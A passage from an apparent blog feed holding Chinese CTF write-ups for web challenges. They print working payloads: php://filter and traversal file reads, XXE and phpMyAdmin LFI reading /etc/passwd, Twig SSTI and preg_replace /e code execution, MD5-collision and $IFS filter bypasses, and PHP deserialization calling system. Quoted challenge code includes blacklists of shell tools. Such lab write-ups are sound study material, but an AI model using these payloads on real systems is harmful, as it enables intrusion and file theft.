&lt;p&gt;&lt;strong&gt;你👱🏻‍太拉胯了,只能继续看题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;否则你👱🏻‍只能从CTF的世界里Get Out了&lt;/st</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>快乐寒假5</title>
    <link href="http://example.com/2022/02/20/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%875/"/>
    <id>http://example.com/2022/02/20/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%875/</id>
    <published>2022-02-20T15:50:52.000Z</published>
    <updated>2022-02-21T09:29:19.558Z</updated>
    
    <content type="html"><![CDATA[<p><strong>你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多</strong></p><p><strong>你👱🏻‍太拉胯了,只能继续看题</strong></p><p><strong>否则你👱🏻‍只能从CTF的世界里Get Out了</strong></p><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>打开网页,点击了可以点击的按钮后</p><p><img src="https://s2.loli.net/2022/02/20/L8SijebxpPKQ7v3.png"></p><p>你👱🏻‍感觉可能有SQL注入或者文件包含,</p><p>尝试利用php://filter伪协议获取index.php源码</p><pre><code>php://filter/read=convert.base64-encode/resource=index.php</code></pre><p>输入后发现报错,把后缀去掉后就好了</p><p>   <img src="https://s2.loli.net/2022/02/20/9DNO8znR2kxGhEW.png"></p><p>得到一串base64加密的字符串 解密后得到源码</p><pre><code>       &lt;?php            $file = $_GET[&#39;category&#39;];            if(isset($file))            &#123;                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;                    include ($file . &#39;.php&#39;);                &#125;                else&#123;                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                &#125;            &#125;        ?&gt;</code></pre><p>你👱🏻‍传入的category需要有woofers,meowers,index才能包含传入以传入名为文件名的文件，所以你👱🏻‍要想办法包含flag.php</p><p>你👱🏻‍尝试</p><pre><code>/index.php?category=woofers/../flag</code></pre><p>出现了新内容</p><p><img src="https://s2.loli.net/2022/02/20/IUTrSFC5zsLD6YZ.png"></p><p>这里需要利用伪协议php://filter套一层协议,读取flag.php</p><pre><code>/index.php?category=php://filter/convert.base64-encode/index/resource=flag</code></pre><p>得到字符串base64解码后即为flag</p><h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>你👱🏻‍一进去就是这个</p><p><img src="https://s2.loli.net/2022/02/21/RWJuDUowPsVqkyG.png"></p><p>url为</p><pre><code>http://4ccae426-3dff-42d7-b2fd-c23ce89ee664.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=</code></pre><p>将img后的字符串解码两次 得到3535352e706e67</p><p>将3535352e706e67进行16进制转字符串得到555.png</p><p>使用类似的加密反推index.php得到</p><p>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</p><p><img src="https://s2.loli.net/2022/02/21/hxCDUXZKgIbwQJB.png"></p><p>将字符串进行base64解码后得到</p><pre><code>&lt;?php  error_reporting(E_ALL || ~ E_NOTICE);  header(&#39;content-type:text/html;charset=utf-8&#39;);  $cmd = $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;img&#39;]) || !isset($_GET[&#39;cmd&#39;])) header(&#39;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#39;); $file = hex2bin(base64_decode(base64_decode($_GET[&#39;img&#39;]))); $file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123;echo &#39;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#39;;die(&quot;xixi～ no flag&quot;);&#125; else &#123;$txt = base64_encode(file_get_contents($file));echo &quot;&lt;img src=&#39;data:image/gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;/img&gt;&quot;;echo &quot;&lt;br&gt;&quot;;&#125; echo $cmd; echo &quot;&lt;br&gt;&quot;; if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123;echo(&quot;forbid ~&quot;);echo &quot;&lt;br&gt;&quot;;&#125; else &#123;if ((string)$_POST[&#39;a&#39;] !== (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) === md5($_POST[&#39;b&#39;])) &#123;    echo `$cmd`;&#125; else &#123;    echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt;</code></pre><p>(最开始查看源代码也有一串base加密后的字符串,但是你👱🏻‍解密后发现那个就是图片的意思,应该没什么用)</p><p>有一个md5强绕过</p><p>解法如下：</p><pre><code>    a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2      b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</code></pre><p>然后过滤了ls echo等,但是我们还可以用dir</p><p><img src="https://s2.loli.net/2022/02/21/sIlkbpJoLCMidwr.png"></p><p>发现没有flag,再访问根目录,这里过滤了空格,所以用%20代替空格</p><p><img src="https://s2.loli.net/2022/02/21/yxbYivHpScoJ5RV.png"></p><p>但是过滤了cat,这里的绕过方法有</p><p>ca\t 后面的\t会成为 TAB 而绕过<br>接着就简单了</p><pre><code>ca\t%20/flag</code></pre><p>这里的正则还过滤了反斜杠字符,你👱🏻‍发现反斜杠这里还有挺多细节的</p><p>如果要让正则匹配出一个\字符，则需要在php中的pattern中添加四个\字符，经过php解释器解释成两个\字符，再有正则解释器解释成一个字符\</p><p>这里得到flag</p><h1 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h1><p>进去是个登陆页面,第一眼感觉是sql注入</p><p>对登陆进行抓包</p><p><img src="https://s2.loli.net/2022/02/21/BSwknQmZ9t7OWVr.png"></p><p>这里题目提示了xml实体,所以你👱🏻‍得去了解一下xml实体</p><pre><code>XXE漏洞全称XML External Entity Injection 即XML外部实体注入。XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击等危害。XXE漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。</code></pre><p>XXE常见利用方式</p><p>与SQL相似，XXE漏洞也分为有回显和无回显</p><pre><code>有回显，可以直接在页面中看到payload的执行结果或现象。无回显，又称为blind xxe，可以使用外带数据(OOB)通道提取数据。即可以引用远程服务器上的XML文件读取文件。解析xml在php库libxml，libxml&gt;=2.9.0的版本中没有XXE漏洞。</code></pre><p>这里需要构造恶意实体,尝试读取文件</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE note [&lt;!ENTITY admin SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</code></pre><p><img src="https://s2.loli.net/2022/02/21/ZOvLRxurMXG3Bh5.png"></p><p>再尝试读取flag</p><pre><code> &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE note [ &lt;!ENTITY admin SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;user&gt;&lt;username&gt;&amp;admin;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;</code></pre><p>成功拿下flag</p><h1 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h1><p>你👱🏻‍打开题目,一共有两个地方可以点,一个flag,一个hint</p><p>flag应该是什么注入,hint不知道什么意思</p><p>F12可以看到Hint提示我们在cookie那里进行攻击</p><p><img src="https://s2.loli.net/2022/02/21/QVK8I3azp2Ycygo.png"></p><p>你👱🏻‍找了一下服务端注入,感觉这个整理的还不错</p><p><img src="https://pic2.zhimg.com/v2-3321f46859c0be9e93f9ad79f3dd1cd3_1440w.jpg?source=172ae18b"></p><p>这里的绿线表示结果成功返回，红线反之。有些时候，同一个可执行的 payload 会在不同引擎中返回不同的结果，比方说49会在 Twig 中返回49，而在 Jinja2 中则是7777777。</p><p>附上原网址</p><p><a href="https://zhuanlan.zhihu.com/p/28823933">https://zhuanlan.zhihu.com/p/28823933</a></p><p>输入49,如果返回49则是Twig模板</p><p>如果返回77777777则表示是Jinja2模块</p><p>使用burpsuite发现注入点</p><p><img src="https://s2.loli.net/2022/02/21/XMS6AsDKYHrzlJo.png"></p><p>换成49</p><p><img src="https://s2.loli.net/2022/02/21/9bk2Qe5EKu6DJG1.png"></p><p>用对应的Twig模块的payload攻击</p><pre><code>&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125;&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("cat /flag")&#125;&#125;</code></pre><p><img src="https://s2.loli.net/2022/02/21/Z8zmLqaMcfXRwov.png"></p><p>OK了family们</p><h1 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h1><p>你👱🏻‍打开网站,是个shop</p><p>买🐴试试看</p><p><img src="https://s2.loli.net/2022/02/21/3vMZyFDOLhA6TCK.png"></p><p>只允许输入一个字符</p><p>那你👱🏻‍只输入一个试试看</p><p><img src="https://s2.loli.net/2022/02/21/gbhBaSo4p2lUANj.png"></p><p>😅说是买了错误的商品</p><p>那应该是最expensive的那个1337了</p><p>根据提示,这道题应该涉及到python和unicode</p><p>这里只能输入一个字符,又要大于1337,所以应该是特殊的符号之类的</p><p><a href="https://www.compart.com/en/unicode/" title="这里直接搜thousand以上的">https://www.compart.com/en/unicode/</a></p><p>比如这个,</p><p><img src="https://s2.loli.net/2022/02/21/g6ezV1ibCU2xqIf.png"></p><p>它的UTF-8编码是0xE2 0x86 0x82,将0x换成%</p><p>得到%E2%86%82</p><pre><code>id=4&amp;price=%E2%86%82</code></pre><p>传参即可得到flag</p><h1 id="WUSTCTF2020-朴实无华"><a href="#WUSTCTF2020-朴实无华" class="headerlink" title="[WUSTCTF2020]朴实无华"></a>[WUSTCTF2020]朴实无华</h1><p>你👱🏻‍进去就是Hack me</p><p>必须给你拿下</p><p>其他的什么提示都没有</p><p>扫一下目录</p><p><img src="https://s2.loli.net/2022/02/21/nu7HTAdsGYxlP3M.png"></p><p>扫到了robots.txt</p><p>robots.txt是这个样子</p><p><img src="https://s2.loli.net/2022/02/21/YU6GXPflv19F45q.png"></p><p>进入这个文件,只有一个假flag,现在也没别的线索,你👱🏻‍抓个包试试</p><p><img src="https://s2.loli.net/2022/02/21/mD3nbodOegBj8lk.png"></p><p>这里出现了新的/fl4g.php</p><p><img src="https://s2.loli.net/2022/02/21/HNdZMpBKy1tV7IC.png"></p><p>我超,朱1️⃣🥚</p><p>还有源码</p><p>可以看到一共有3层</p><p>第一层是intval函数的关卡</p><p>Get传参num,其中num的值既要小于2020,加1后又要大于2021</p><p>如果不传入num就得滚去Africa,传入的不满足条件就会变成poor man</p><p>看看intval这里有什么特性</p><p><img src="https://img-blog.csdnimg.cn/202003301215118.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTM5NTI3,size_16,color_FFFFFF,t_70#pic_center"></p><p>这里借用一下别人的研究成果</p><p>里面有个重要的东西</p><pre><code>echo intval(1e10);    // 1410065408echo intval(&#39;1e10&#39;);  // 1</code></pre><p>如果intval函数参数填入科学计数法的字符串，会以e前面的数字作为返回值，这里是1</p><p>那么当对字符串’1e10’+1是不是可以将字符串类型强行转换成数字类型呢</p><p>经过测试,可以这样绕过,于是构造url</p><pre><code> ?num=2e4</code></pre><p>不知道为什么加单引号的时候还是过不了</p><p>第二层是md5弱类型</p><p>这个搜一下就有了</p><p>payload为</p><pre><code>&amp;md5=0e215962017</code></pre><p>来到最后一层</p><p>这里要求传入参数get_flag而且不能有空格</p><p>如果有cat,则会被替换成wctf2020,传入的get_flag会被当成系统命令执行</p><p>先用ls列出文件,其中最长的那个应该就是了</p><p>cat不能用,你👱🏻‍就用tac</p><p>用$IFS$9代替空格</p><p>最终payload为</p><pre><code>    fl4g.php?num=2e4&amp;md5=0e215962017&amp;get_flag=tac$IFS$9fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code></pre><p>拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍寒假打了几次比赛,但是做出来的题跟打的比赛次数差不多&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;你👱🏻‍太拉胯了,只能继续看题&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;否则你👱🏻‍只能从CTF的世界里Get Out了&lt;/st</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>快乐寒假4</title>
    <link href="http://example.com/2022/02/10/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%874/"/>
    <id>http://example.com/2022/02/10/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%874/</id>
    <published>2022-02-10T05:37:52.000Z</published>
    <updated>2022-02-20T09:17:40.578Z</updated>
    
    <content type="html"><![CDATA[<p><strong>你👱🏻‍滴寒假本来似上分滴time</strong><br><strong>不过你👱🏻‍后面确实success了,继续滚回来do题</strong></p><h1 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h1><p>又是一道感觉似曾相识的题目</p><p>你👱🏻‍打开环境,映入眼幕的是问你👱🏻‍flag在哪,别的没了</p><p>查看源代码也没有任何东西,看起来无货可整。</p><p>在没有其他明显目录而且没有hint的情况下考虑存在git泄露</p><p>使用Githack看看</p><p>果然扫出来一个,下面是源码</p><pre><code>&lt;?phpinclude &quot;flag.php&quot;;echo &quot;flag在哪里呢？&lt;br&gt;&quot;;if(isset($_GET[&#39;exp&#39;]))&#123;if (!preg_match(&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;, $_GET[&#39;exp&#39;])) &#123;    if(&#39;;&#39; === preg_replace(&#39;/[a-z,_]+\((?R)?\)/&#39;, NULL, $_GET[&#39;exp&#39;])) &#123;        if (!preg_match(&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;, $_GET[&#39;exp&#39;])) &#123;            // echo $_GET[&#39;exp&#39;];            @eval($_GET[&#39;exp&#39;]);        &#125;        else&#123;            die(&quot;还差一点哦！&quot;);        &#125;    &#125;    else&#123;        die(&quot;再好好想想！&quot;);    &#125;&#125;else&#123;    die(&quot;还想读flag，臭弟弟！&quot;);    &#125;&#125;// highlight_file(__FILE__);?&gt;</code></pre><p>分析下源码,大概是以下这样</p><ol><li>需要以GET形式传入一个exp参数，如果满足条件，会执行这个参数的内容；</li><li>过滤了几个常用的伪协议；</li><li>(?R)?重复引用当前表达式（递归调用），所以只能无参数绕过；</li><li>过滤了一些关键字，限制一些函数的使用</li></ol><p>首先查看下当前目录的文件</p><pre><code>payload:?exp=print_r(scandir(current(localeconv())));</code></pre><ol><li>localconv():函数返回一包含本地数字及货币格式信息的数组，数组第一项是.</li><li>current()/pos():函数返回数组中的当前元素，初始指向第一个元素。</li><li>所以current(localeconv())==’.’  （永远是点）</li><li>scandir(‘.’):列出当前目录中的文件和目录。</li></ol><p>![)PK6UYXP4`S$G8ZLJSDBT{9.png](<a href="https://s2.loli.net/2022/02/08/qZLCNT5R6MAShUt.png">https://s2.loli.net/2022/02/08/qZLCNT5R6MAShUt.png</a>)</p><p>然后要读flag.php的内容</p><pre><code>payload:?exp=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></pre><p>得到flag</p><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>你👱🏻‍打开环境 只有两行字,F12确实就那点字</p><p>既然提到了数据库,那么可以推测有phpmyadmin存在</p><p>你👱🏻‍用扫描一看确实,直接进入连密码都不用输,</p><p><img src="https://s2.loli.net/2022/02/09/5HBmciRJOQL1SnA.png"></p><p>phpmyadmin4.8.0-4.8.1存在文件包含漏洞</p><p>使用你👱🏻‍找的payload直接打</p><pre><code>?target=db_datadict.php%253f/../../../../../../../../etc/passwd</code></pre><p><img src="https://s2.loli.net/2022/02/09/AHdrKiYcDqZampW.png"></p><p>将etc/passwd改成flag得到flag</p><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><p>打开题目,嗯,代码审计</p><pre><code>&lt;?php   error_reporting(0);   $text = $_GET[&quot;text&quot;];   $file = $_GET[&quot;file&quot;];   if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)===&quot;I have a dream&quot;))&#123;echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;/h1&gt;&lt;/br&gt;&quot;;if(preg_match(&quot;/flag/&quot;,$file))&#123;    die(&quot;Not now!&quot;);&#125;include($file);  //next.php&#125;else&#123;highlight_file(__FILE__);&#125;?&gt;</code></pre><p>可以用php://input伪协议来绕过file_get_contents()</p><p>因为有include(),所以可以用php://filter来读取文件</p><p>于是构造payload为</p><pre><code>?text=data://text/plain,I have a dream&amp;file=php://filter/convert.base64-encode/resource=next.php</code></pre><p>得到一段base64加密的字符串,解密后得到</p><pre><code> &lt;?php     $id = $_GET[&#39;id&#39;];     $_SESSION[&#39;id&#39;] = $id;function complex($re, $str) &#123;   return preg_replace(      &#39;/(&#39; . $re . &#39;)/ei&#39;,      &#39;strtolower(&quot;\\1&quot;)&#39;,       $str    ); &#125; foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\n&quot;; &#125; function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]); &#125; </code></pre><p>继续进行代码审计,这里你👱🏻‍说一下知识点</p><pre><code>preg_replace()函数最后以/e结尾时，会存在命令执行漏洞，也就是说如果有/e，并且匹配到符合正则表达式的字符串，那么第二个参数的字符串将被当做代码来执行</code></pre><p>这里的第二个参数是strtolower(“\1”),也就是strtolower(“\1”),而而\1在正则表达式中有自己的意思，也就是指定第一个匹配项，简单来说就是取出正则表达式匹配后子匹配表达式的第一项</p><p>这里你👱🏻‍还偷了一点正则表达式的知识点</p><pre><code>正则表达式的\S：匹配所有非空白字符； .号：匹配除\n外的任意字符； *号：匹配前面的字符0次或者多次 +号：匹配前面的字符1次或者多次（如果要在url里输入+号，必须要对其进行编码，+号编码为:%2b）php里，如果 双引号中有变量，那么php解释器会将其替换为变量解释后的结果，但单引号中的变量不会被处理（不过双引号中的函数不会被执行）</code></pre><p>继续审计,对于foreach()函数,这个函数就是将我们传进去的参数变为正则,并且参数值变为字符串,getFlag()是需要我们eval执行的。</p><p>接下来构造payload</p><pre><code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></pre><p>这个简单来说就是php5.5.0起的一个漏洞，pl为 /?.<em>={${phpinfo()}}。get值是/?.</em>,参数是{${phpinfo()}}</p><p>这里解释下用\S*而不是用.*的原因：</p><p>因为在php中，对于传入非法的$_GET参数名，会将其转换为下划线，导致正则匹配失效</p><p>这里的.<em>会被和谐成_</em></p><p>所以你👱🏻‍只能使用\S*或者\S%2b来进行构造payload</p><p>所以最后为</p><pre><code>http://e86a8450-06ee-47e1-84d7-a672322f8cfc.node4.buuoj.cn:81/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(%27cat%20/flag%27);</code></pre><h1 id="网鼎杯-2020-朱雀组-phpweb"><a href="#网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="[网鼎杯 2020 朱雀组]phpweb"></a>[网鼎杯 2020 朱雀组]phpweb</h1><p><img src="https://s2.loli.net/2022/02/10/HpiAGLZVqF5uOzS.png"></p><p>可以 这风格你👱🏻‍喜欢</p><p>抓个包</p><p><img src="https://s2.loli.net/2022/02/10/1nlriGMet6qCuUj.png"></p><p>POST有两个参数,其中date是函数,后面是他的参数,换成读取源代码确实能读到源代码,这里还可以合理怀疑使用了call_user_func()函数</p><p><img src="https://s2.loli.net/2022/02/10/4VlmGq1ykLEWcOT.png"></p><pre><code>&lt;?php$disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;,  &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;);function gettime($func, $p) &#123;    $result = call_user_func($func, $p);    $a= gettype($result);    if ($a == &quot;string&quot;) &#123;        return $result;    &#125; else &#123;return &quot;&quot;;&#125;&#125;class Test &#123;    var $p = &quot;Y-m-d h:i:s a&quot;;    var $func = &quot;date&quot;;    function __destruct() &#123;        if ($this-&gt;func != &quot;&quot;) &#123;            echo gettime($this-&gt;func, $this-&gt;p);        &#125;    &#125;&#125;$func = $_REQUEST[&quot;func&quot;];$p = $_REQUEST[&quot;p&quot;];if ($func != null) &#123;    $func = strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre><p>这里可以看到禁用了system等函数,所以可以用序列化加上url编码绕过</p><p>因为过滤只对我们输入的post的func进行检查,在test类里并没有检查,所以更改Test类中的参数即可让我们的system函数传入</p><p>先查看目录</p><pre><code>&lt;?php   class Test &#123;    var $p = &quot;ls /&quot;;    var $func = &quot;system&quot;;    &#125; $a = new Test(); echo serialize($a); //unserialize?&gt;</code></pre><p>再看flag在哪</p><p><img src="https://s2.loli.net/2022/02/10/6HZMt1jTB3FAeNo.png"></p><p>最后再看flag</p><pre><code>  &lt;?php class Test &#123;    var $p = &quot;cat /tmp/flagoefiu4r93&quot;;    var $func = &quot;system&quot;; &#125;$a = new Test();echo serialize($a);//unserialize?&gt;</code></pre><p><img src="https://s2.loli.net/2022/02/10/y5abSW3Px7Beks1.png"></p><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p><img src="https://s2.loli.net/2022/02/10/qajX2oRcSGLdPJT.png"></p><p>都这样说了 你👱🏻‍不得去看看源🐴？</p><p><img src="https://s2.loli.net/2022/02/10/Cta9edW6Ek8ZRDG.png"></p><p>这🐴好多,你👱🏻‍作为银类肯定是整不动了,只能ask for 帮助了</p><p>随便打开一个页面，发现里面存在着大量的system和eval函数，而且参数是我们可控的,所以你👱🏻‍可以通过$_GET[]来传递命令，然后由system()或eval()执行,但大概率是只有答案那个参数可以用,所以我们需要脚本来找出那个参数。</p><p>后面你👱🏻‍自己写和找的脚本都不行</p><p>这题你👱🏻‍卡太久 暂时跳过</p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>进来什么都没有,是个模板前端</p><p>你👱🏻‍用哪dirsearch扫了一下 发现.git泄露</p><p>用githack下载下来源码 分别有flag.php和index.php</p><p>flag的内容只有：</p><pre><code>$flag = file_get_contents(&#39;/flag&#39;);</code></pre><p>index的内容有:</p><pre><code>&lt;?php include &#39;flag.php&#39;; $yds = &quot;dog&quot;; $is = &quot;cat&quot;; $handsome = &#39;yds&#39;; foreach($_POST as $x =&gt; $y)&#123; $$x = $y; &#125; foreach($_GET as $x =&gt; $y)&#123;$$x = $$y;&#125;foreach($_GET as $x =&gt; $y)&#123;if($_GET[&#39;flag&#39;] === $x &amp;&amp; $x !== &#39;flag&#39;)&#123;    exit($handsome);&#125;&#125;if(!isset($_GET[&#39;flag&#39;]) &amp;&amp; !isset($_POST[&#39;flag&#39;]))&#123;exit($yds);&#125;if($_POST[&#39;flag&#39;] === &#39;flag&#39;  || $_GET[&#39;flag&#39;] === &#39;flag&#39;)&#123;exit($is);&#125;echo &quot;the flag is: &quot;.$flag;</code></pre><p>前两个foreach语句分别将POST参数和GET参数进行变量覆盖，接着是三个if语句，exit()函数退出脚本的同时输出变量，最后一句是输出我们想要的flag</p><p>你👱🏻‍要做的就是让脚本执行到最后一句echo $flag;</p><p>但即使绕过三个if语句，我们GET传参或者POST传参的flag总会被变量覆盖：如我们GET传参flag=aaa，在第二个foreach语句中变成$flag = $aaa，而$aaa变量没有定义为空，最后的输出就是空</p><p>我们POST传参flag=aaa，在第一个foreach语句中变成$flag= aaa，flag被覆盖为‘aaa’，最后输出aaa</p><p>你👱🏻‍沾点无奈了，但是if语句中的exit()函数虽然会退出执行，但也会输出其参数，你👱🏻‍可以利用变量覆盖将exit()函数内的参数用$flag覆盖掉就能输出flag了</p><p>这里面有三个if语句，其中有两个能利用变量覆盖输出flag,也就是说有两种方法</p><p>一是第二个if语句中可以看到这里是输出的$yds变量，那么我们就要通过变量覆盖达到$yds=$flag的效果，GET传参yds=flag，在第二个foreach语句中，首先是$x=yds，$y=flag，经过$$x = $$y也就变成了$yds=$flag</p><p>二是第三个if语句中输出变量$is，判断条件为$_POST[‘flag’] === ‘flag’ || $_GET[‘flag’] === ‘flag’，这里可以通过满足后面这个条件进行变量覆盖：GET传参is=flag&amp;flag=flag；在第二个foreach语句中，首先是$x=is,$y=flag,带进去就变成了$is=$flag，这就达到了覆盖的目的，而参数中flag=flag只是为了满足if语句</p><p>传入进去 F12就拿到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;你👱🏻‍滴寒假本来似上分滴time&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;不过你👱🏻‍后面确实success了,继续滚回来do题&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&quot;GXYCTF2019-禁止套娃&quot;&gt;&lt;a href=&quot;#GXYCTF2019-</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>快乐寒假3</title>
    <link href="http://example.com/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/"/>
    <id>http://example.com/2022/02/06/%E5%BF%AB%E4%B9%90%E5%AF%92%E5%81%873/</id>
    <published>2022-02-06T05:37:52.000Z</published>
    <updated>2022-02-27T08:51:47.233Z</updated>
    
